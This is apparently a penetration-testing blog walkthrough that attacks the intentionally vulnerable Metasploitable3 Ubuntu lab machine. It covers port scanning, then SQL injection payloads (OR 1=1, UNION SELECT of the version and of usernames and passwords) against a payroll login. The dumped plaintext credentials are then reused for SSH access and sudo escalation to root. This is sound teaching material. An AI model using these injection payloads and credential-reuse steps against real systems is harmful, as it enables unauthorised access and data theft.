&lt;h3 id=&quot;overview-of-flags&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#overview-of-flags&quot; aria-label=&quot;overview of flags permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Overview of Flags&lt;/h3&gt;
&lt;p&gt;According to the &lt;code class=&quot;language-text&quot;&gt;flags.rb&lt;/code&gt; Chef &lt;em&gt;recipe&lt;/em&gt; in the metasploitable &lt;em&gt;cookbook&lt;/em&gt;, there are a total of 10 flags in the default metasploitable3 Ubuntu Linux version. They are listed below for reference:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;10 of Clubs (no difficulty specified)&lt;/li&gt;
&lt;li&gt;7 of Diamonds (no difficulty specified)&lt;/li&gt;
&lt;li&gt;10 of Spades (easy)&lt;/li&gt;
&lt;li&gt;8 of Clubs (easy)&lt;/li&gt;
&lt;li&gt;3 of Hearts (easy)&lt;/li&gt;
&lt;li&gt;9 of Diamonds (easy)&lt;/li&gt;
&lt;li&gt;5 of Diamonds (hard)&lt;/li&gt;
&lt;li&gt;2 of Spades (hard)&lt;/li&gt;
&lt;li&gt;8 of Hearts (hard)&lt;/li&gt;
&lt;li&gt;Joker red (hard)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The difficulty rating is gained from the flags &lt;em&gt;recipe&lt;/em&gt; used when building the virtual machine. The listing is only for reference, and finding the flags is not the goal of this post. However, leave a comment if you are interested, and I could investigate this in the future.&lt;/p&gt;
&lt;h2 id=&quot;initial-assessment&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#initial-assessment&quot; aria-label=&quot;initial assessment permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Initial Assessment&lt;/h2&gt;
&lt;p&gt;As usual, starting with a port scan seems like a logical first step. The results of a basic service scan are displayed below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;root@kali:~# nmap -sV -Pn -T4 -p 1-65535 -oX metasploitable3.xml 192.168.19.20
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-04 17:50 EDT
Nmap scan report for 192.168.19.20
Host is up (0.00032s latency).
Not shown: 65525 filtered ports
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         ProFTPD 1.3.5
22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open   http        Apache httpd 2.4.7
445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp  open   ipp         CUPS 1.7
3000/tcp closed ppp
3306/tcp open   mysql       MySQL (unauthorized)
3500/tcp open   http        WEBrick httpd 1.3.1 (Ruby 2.3.7 (2018-03-28))
6697/tcp open   irc         UnrealIRCd
8181/tcp open   http        WEBrick httpd 1.3.1 (Ruby 2.3.7 (2018-03-28))
MAC Address: 00:0C:29:00:43:58 (VMware)
Service Info: Hosts: 127.0.0.1, METASPLOITABLE3-UB1404, irc.TestIRC.net; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.18 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The port scan revealed a number of open ports running interesting services. Maybe I have been doing too much web application security, but port 80 and 8181 peaked my interest. Same with port 6697, running UnrealIRCd - which I remember exploiting on Metasploitable2. Ports 21 and 22 were also of interest. &lt;/p&gt;
&lt;h2 id=&quot;port-80-payroll-web-application&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#port-80-payroll-web-application&quot; aria-label=&quot;port 80 payroll web application permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Port 80: Payroll Web Application&lt;/h2&gt;
&lt;p&gt;Checking out port 80 using Firefox in Kali Linux revealed directory listing containing a number of entries. The entries are displayed in the figure below:&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/9ef3e7f39a223d1e503690b2d2409fbd/7762d/port80.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 78.48101265822784%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACX0lEQVQ4y6VUa3OiQBDk//+oiyn1EqPnCx9EK4qAgCA+QDBnCZ3pVcydfrq6reqacXe2t+eB2vl8xuFwQJIkYhPll0jT9MGnvcRe7pQ4Ho8oigKa7/sYDAZ4f5/AMAyMx2NlR6MR6vU6Go2GQqVSQa1WQ7PZxGQykfh39Pt9VKtVtU+QVLNtWwXxEonLYEPQ7XbRarWg67q6TEsMh0MFxhP0O52OUqo5joPWrzZms5lSx8PJdIogCBBFkbJhGMJ1Pcznc5imCcuy1P5qtVLZ9Ho9JYjl0Ja2iWHzGUNJkWm2RO1PkU8lDKQyqqQC/qZP5fzdbreV5T3GK4W+50LvNFWwrkvKUstupw3WNoo2WK+jGzab7dXfXM/WsrdRDfI8D3EcQwuCEC+vDTw9VeTFN0l9gp6oOp0+8S9rv9+XhMFtU0oiyi7+bgepVYGPj1xSyuWskMdyLBa57J2leWfpaiGRuYrfbrffhLGwZ1mG5TKF46T4/Myk6AdpQiJNOAjRQR5KYduMyWQvE+JM4khWXAXsroQrH2b/BX39N+LkOwXHsQSmELti56Igup6cr6ouZBzmB8K35x8wBgnm0wxZnCGORI1lw5IZ9Txf1FiqAbG8mOckwR+4Jwx8dF/rMPQEH0aKQTuBK2k6ji1EC3DwCXadZblfD4Sh1NA1Z5ibW1EUw1zsEK53oigUkpUaXoLDzU5yTNgA4nQ63Qj/akoos7Xfb2TSY+lcosj4IgnKPwH6vFTu05ZkXCTjvsbPy3VdUREoRRdVwU0ZUy39e/CMA03LT5gl0fI8V8z/C37HXF+pXKfzJ5p5NAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;Directory listing of Apache on port 80&quot;
        title=&quot;Directory listing of Apache on port 80&quot;
        src=&quot;/static/9ef3e7f39a223d1e503690b2d2409fbd/f058b/port80.png&quot;
        srcset=&quot;/static/9ef3e7f39a223d1e503690b2d2409fbd/c26ae/port80.png 158w,
/static/9ef3e7f39a223d1e503690b2d2409fbd/6bdcf/port80.png 315w,
/static/9ef3e7f39a223d1e503690b2d2409fbd/f058b/port80.png 630w,
/static/9ef3e7f39a223d1e503690b2d2409fbd/7762d/port80.png 649w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;The first item of interest was &lt;code class=&quot;language-text&quot;&gt;payroll_app.php&lt;/code&gt;. This file loaded a &lt;em&gt;Payroll Login&lt;/em&gt; system. The &lt;code class=&quot;language-text&quot;&gt;nmap&lt;/code&gt; output had identified a MySQL server running on Metasploitable3. Instantly, an SQL injection attack came to mind. So I started with the classic &lt;code class=&quot;language-text&quot;&gt;&apos; OR 1=1#&lt;/code&gt;. &lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/1cb5bf8053962b65a44b4c8cbce50980/ae6b7/webapp_port80.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 75.9493670886076%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABxUlEQVQ4y52S6YoiQRCEff9XGtj9ISgrtt3e2t7ifeN9x/aXQw09szIDmxB0WUZGRmZl4vl8arPZaLFYvMRkMtFoNDJMp1O7m8/n9p3NZhqPxxoOh1oulyISp9NJxWJRpXI5+pZUqVRUjs6lEueqMpmMksmkUqmUgiBQvV5XtVpVrVazPO5BOp3W7XZT4ng8yvNy8n1fQYRCoWBnz/NMnEKIhGFoQk6MO2CcqDjFzufzu2A2m1UYkVrhe3Uqk9Rut9VqtdTpdDQYDNWMztz1er2PUcBDDAOXyyUSPF1U+fNLBd+TH+Tl53L6/famXPSlunOA8zByRDIdADj5fF7NZtOMmMPD4WBDfjweul6vhvv9bgPudrvmjtZwReJgMLD/mJfj87A8EN2a4Gq1VjywTjUEcMYjIUxbjUbjQ4hAjOCVY4KrT2KsxH6/NxeQOAM2Av56vTYBJ0qQ81IQZ5AhEOwZLdM+o3E7iChcF986JIlZAZbZFYgDQbg/CtIWZETj9y7czLbbrXF/FGQuzgHY7Xb/gHmSw4xfCpIYD9aGdtxrvwJrFo9Pgl/3kMqIfof4HpLLHjKCBD94SRa33+//F8jl8ZjvXyPAZeHNEmryAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;Payroll web application running on Apache on port 80&quot;
        title=&quot;Payroll web application running on Apache on port 80&quot;
        src=&quot;/static/1cb5bf8053962b65a44b4c8cbce50980/f058b/webapp_port80.png&quot;
        srcset=&quot;/static/1cb5bf8053962b65a44b4c8cbce50980/c26ae/webapp_port80.png 158w,
/static/1cb5bf8053962b65a44b4c8cbce50980/6bdcf/webapp_port80.png 315w,
/static/1cb5bf8053962b65a44b4c8cbce50980/f058b/webapp_port80.png 630w,
/static/1cb5bf8053962b65a44b4c8cbce50980/ae6b7/webapp_port80.png 655w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;After entering the SQL injection attack in the &lt;em&gt;User&lt;/em&gt; input box, I hit &lt;em&gt;OK&lt;/em&gt;. Seems like no password was required to be entered. The SQL injection revealed a total of 15 users in the Payroll App. It seems like the is some terrible handling of user input that constructs the SQL statements. String concatenation no doubt! The output of the SQL injection attack is displayed below:&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 575px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/ccc2a4390e2bafa77f2abe04f3a0833b/59415/webapp_port80_users.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 163.9240506329114%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAhCAYAAADZPosTAAAACXBIWXMAAAsTAAALEwEAmpwYAAADBUlEQVRIx23Wh24EIQwE0P3/70vvvddLr0QPaZA3CRK3C7iM7TF70/f3d8v8+vpqxtraWlteXm77+/ttY2Oj3d7etuPj47a0tNROT0/73Nra6rJV35zaP+Pw8LCtrq623d3dbuTq6qpdX1934+fn5+3s7Kzt7e39p9qm19fXdnNz0+7u7sZ8enoa0/nDw0N7fHxsz8/P/Zl3yM37+/v+fHl5aRPv7+/vXXmxWAzlt7e3vseBPWcUIscIo/a8e7I1sWxY7OzstPX19R6WQXFzc7OHJ6+fn5/9zJrcxcVFj2BlZaW/k58ggIY33j0zGKhrAxKIRRUZCA22JguWJf3k5KTnsypfXl6OChoiOjo66sgiY+28G/Tj0JNhCt6Nj4+P/g5FRvKX3KMapzOEvEBmylE1CLlnNcgYOfsMWs8MygkvOciQ03hPyByQz4AS6RkeISf5yUuU7UNf98gwUmXQLPkdRcF+RTFrUbRfHBlC1XppUwzRWaJhqyN0yAtFApU2QRNEoVelTVIwQnYIoXxV2tTQ8iSPJogchIlqVuVQJvlIvkLaGHTOaSoPoWIyPAwKQ/Uc1ArmAviNELqkhmF5TU/3kC0YtGEdZUrSkEqHh5xUGen6E3I6JCEmhxylADXkKvOnU4SWPhbOwcFBR0L4d39zIEQy0MkhGs16WR4YQAc59LRHOPdgzWtk0M2c0YYCBLyggzaqykib3jacV/Jjwvb29rjGBrEd2ITMFIJ1wqo5qzJ0g3bk0IROcrUaVOkSuaqFUjx75OLQDT5rvdyHNtKjCUc6QhGDTO1tRgGZETs8lE8GK8eQvd6HClANOstlO7sPkTMfmnrb2K+oKdciMS5FCjhCZh1hGa63jff0dr1tKtHrZ2KGkJfwLYiCMDeLIV+KEllOrWdFSfzg17uP90riGIAyVCKTYg6EFBAWuStFoAjhIau5/J3DWevlrwgDqbKZ3KbF7CWHkYHwzzdFWBq+XgIpQK6mDPms/ybyTRm9LBRC6JDvbaaz3C6Z1vazppvvufcfv9P2l5tGU80AAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;Payroll web application users&quot;
        title=&quot;Payroll web application users&quot;
        src=&quot;/static/ccc2a4390e2bafa77f2abe04f3a0833b/59415/webapp_port80_users.png&quot;
        srcset=&quot;/static/ccc2a4390e2bafa77f2abe04f3a0833b/c26ae/webapp_port80_users.png 158w,
/static/ccc2a4390e2bafa77f2abe04f3a0833b/6bdcf/webapp_port80_users.png 315w,
/static/ccc2a4390e2bafa77f2abe04f3a0833b/59415/webapp_port80_users.png 575w&quot;
        sizes=&quot;(max-width: 575px) 100vw, 575px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Instantly it is obvious that the web application requires four properties must be returned: Username, First Name, Last Name, and Salary. This information is based on the fact that the webpage displays a table that has these four columns. We already know that there is a database on the server, &lt;code class=&quot;language-text&quot;&gt;nmap&lt;/code&gt; reported that MySQL was running on the default port 3306. Next step: determine the MySQL version that installed. The next step was to execute the following SQL injection attack:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sql&quot;&gt;&lt;pre class=&quot;language-sql&quot;&gt;&lt;code class=&quot;language-sql&quot;&gt;&apos; &lt;span class=&quot;token keyword&quot;&gt;UNION&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;@&lt;span class=&quot;token variable&quot;&gt;@version&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;#&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This revealed that the following MySQL version was running: &lt;code class=&quot;language-text&quot;&gt;5.5.60-0ubuntu0.14.04.1&lt;/code&gt;. Just as a quick summary, the above SQL injection uses the &lt;code class=&quot;language-text&quot;&gt;UNION&lt;/code&gt; statement, which simply provides the ability to execute two SQL statements. The two at symbols (&lt;code class=&quot;language-text&quot;&gt;@@&lt;/code&gt;) refer to a global variable available in SQL, and the &lt;code class=&quot;language-text&quot;&gt;version&lt;/code&gt; command will dump the SQL database version for us. The three &lt;code class=&quot;language-text&quot;&gt;null&lt;/code&gt; entries are because the web application wants to print four columns in a table. Using &lt;code class=&quot;language-text&quot;&gt;null&lt;/code&gt; means the web application should print an empty entry in the first three columns.&lt;/p&gt;
&lt;p&gt;From here it is only too easy. One can guess that each of the users in the database must have a password. We already know the username, as that information was gathered in the first SQL injection attack. Furthermore, it can be assumed that we are querying a table of user information, most likely called &lt;code class=&quot;language-text&quot;&gt;users&lt;/code&gt;. This table will most likely have passwords in it too - this is how a user will be able to login to the Payroll App. Putting all this information together, we can attempt to dump the password information using the following SQL injection attack:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sql&quot;&gt;&lt;pre class=&quot;language-sql&quot;&gt;&lt;code class=&quot;language-sql&quot;&gt;&apos; &lt;span class=&quot;token operator&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;UNION&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;username&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;password &lt;span class=&quot;token keyword&quot;&gt;FROM&lt;/span&gt; users&lt;span class=&quot;token comment&quot;&gt;#&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Again, we can utilize &lt;code class=&quot;language-text&quot;&gt;null&lt;/code&gt; to print nothing in the first two columns. Without this addition, the web application will fail to load correctly. Looks like we got lucky:&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/5121f82782fd2b3a30f707ba8788fc9e/321ea/webapp_port80_passwords.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 50.632911392405056%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA6ElEQVQoz42SBwrEMAwE7/8/Te+9+BjBGvkCRwSJI2FNVmt/mqYJXdeFtm2D4jiOUBRF2LbNcr7Zo1jX1WrXdVl+37etsD6AxnEMWZaFeZ4TYFmW4TzP2KTGZVmiAF83IK9pmmwDIGLfd1NEjgoAapJCRCgeQJT1fR9HADgMg31TA45Sr5Aaua9HoA+vROPwszzPbRUQO6qqSrxMgBQF875IYV3X5jMHxcj0YRNg6uxJgF6ZzwWkGSsIoKjjoaaxXwFZOQA81YkD1HXTuI+R/wFRh1feQzyl7q16DUQdAEC6NvjGdfu9Nl9XEw1XnaaoUQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;Payroll web application user passwords&quot;
        title=&quot;Payroll web application user passwords&quot;
        src=&quot;/static/5121f82782fd2b3a30f707ba8788fc9e/f058b/webapp_port80_passwords.png&quot;
        srcset=&quot;/static/5121f82782fd2b3a30f707ba8788fc9e/c26ae/webapp_port80_passwords.png 158w,
/static/5121f82782fd2b3a30f707ba8788fc9e/6bdcf/webapp_port80_passwords.png 315w,
/static/5121f82782fd2b3a30f707ba8788fc9e/f058b/webapp_port80_passwords.png 630w,
/static/5121f82782fd2b3a30f707ba8788fc9e/321ea/webapp_port80_passwords.png 786w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;In the above figure, we can see the bottom of the first SQL query results. This is the same as the first SQL injection attack (&lt;code class=&quot;language-text&quot;&gt;&apos; OR 1=1#&lt;/code&gt;). Following that, the last two columns display the username and password, &lt;strong&gt;in plaintext&lt;/strong&gt;, for each of the 15 users. &lt;/p&gt;
&lt;p&gt;I was hoping that the user credentials dumped from the MySQL database were not the same credentials used for system authentication… turns out they are! A quick SSH test to Metasploitable3 gained access as the user: &lt;code class=&quot;language-text&quot;&gt;leia_organa&lt;/code&gt; using the password: &lt;code class=&quot;language-text&quot;&gt;help_me_obiwan&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;root@kali:~# ssh leia_organa@192.168.19.20 
The authenticity of host &apos;192.168.19.20 (192.168.19.20)&apos; can&apos;t be established.
ECDSA key fingerprint is SHA256:qvGI7uYbIIalZ0vugejoVujPrAEtQ3d8nvs2K+DMLBc.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &apos;192.168.19.20&apos; (ECDSA) to the list of known hosts.
leia_organa@192.168.19.20&apos;s password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

leia_organa@metasploitable3-ub1404:~$ &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A quick check of the available groups indicated that sudo access was achieved. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;leia_organa@metasploitable3-ub1404:~$ groups
users sudo&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A simple check to gain root access:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;leia_organa@metasploitable3-ub1404:~$ sudo -s
[sudo] password for leia_organa: 
root@metasploitable3-ub1404:~# &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Game over. I hadn’t even opened the Metasploit Framework yet and had full root access to the system! This really shows the power of SQL injection attacks against a poorly coded web application. It makes a great learning exercise, especially for those new to web application security and pentesting. I would like to think that such blatant security issues do not still exist in the wild… however, the &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_Top_10&quot;&gt;OWASP Top 10-2017&lt;/a&gt; still list injection vulnerabilities as the number 1 security issue in web applications.&lt;/p&gt;
&lt;h2 id=&quot;reviewing-the-payroll-app-source-code&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#reviewing-the-payroll-app-source-code&quot; aria-label=&quot;reviewing the payroll app source code permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Reviewing the Payroll App Source Code&lt;/h2&gt;
&lt;p&gt;Breaking the &lt;em&gt;Payroll App&lt;/em&gt; was fun! However, it is prudent that we review the source code that leads to this. Instead of looking at the source from the build process, we shall investigate the source code from the running system. Firstly, the following command attempts to find any occurrences of the word &lt;em&gt;payroll&lt;/em&gt; on the system:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;leia_organa@metasploitable3-ub1404:~$ sudo find / -iname &quot;*payroll*&quot; 2&gt; /dev/null
/var/lib/mysql-default/payroll
/var/www/html/payroll_app.php
/home/kylo_ren/poc/payroll_app&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A total of three search hits. Even from the naming and location, we can gather a lot of information about these:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;/var/lib/mysql-default/payroll&lt;/code&gt;: A folder in for MySQL, most likely contains the database named &lt;em&gt;payroll&lt;/em&gt;, with one or more tables.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;/var/www/html/payroll_app.php&lt;/code&gt;: The website we performed the SQL Injection attack against. Will contain the source code, written in PHP, that powers the &lt;em&gt;Payroll App&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;/home/kylo_ren/poc/payroll_app&lt;/code&gt;: This one is a little strange. It is a directory in the home folder of the &lt;code class=&quot;language-text&quot;&gt;kylo_ren&lt;/code&gt; user. If the Star Wars movies are anything to go by, this is probably something malicious!&lt;/li&gt;
&lt;/ol&gt;
